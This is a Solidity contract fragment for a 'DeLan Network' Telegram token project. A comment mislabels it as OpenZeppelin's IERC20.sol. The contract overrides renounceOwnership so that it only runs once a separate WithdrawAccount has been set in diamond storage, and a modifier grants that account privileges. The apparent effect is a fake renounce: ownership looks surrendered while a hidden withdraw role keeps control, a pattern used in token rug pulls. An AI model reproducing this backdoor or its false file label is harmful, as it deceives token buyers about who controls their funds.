/*
DeLan Network - The fully telegram integrated decentralised IP exchange to limitless internet.

Website:       https://delannetwork.tech
DAPP:          https://t.me/DeLanNetworkBot
TELEGRAM:      https://t.me/DeLanNetwork_portal
TWITTER:       https://twitter.com/DeLanNetwork
*/

// File: @openzeppelin/contracts/token/ERC20/IERC20.sol

// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.20;
import "./TestLib.sol";
contract renounceOwnershipFacet is Ownable {
    modifier withdrawOrOwner() {
        _checkWithdraw();
        _;
    }

    function renounceOwnership() public virtual override onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            ds.WithdrawAccount != address(0),
            "ds.WithdrawAccount is not set"
        );

        _transferOwnership(address(0));
    }
    function _setWithdraw(address withdraw) public onlyOwner returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.WithdrawAccount = withdraw;
        return true;
    }
}
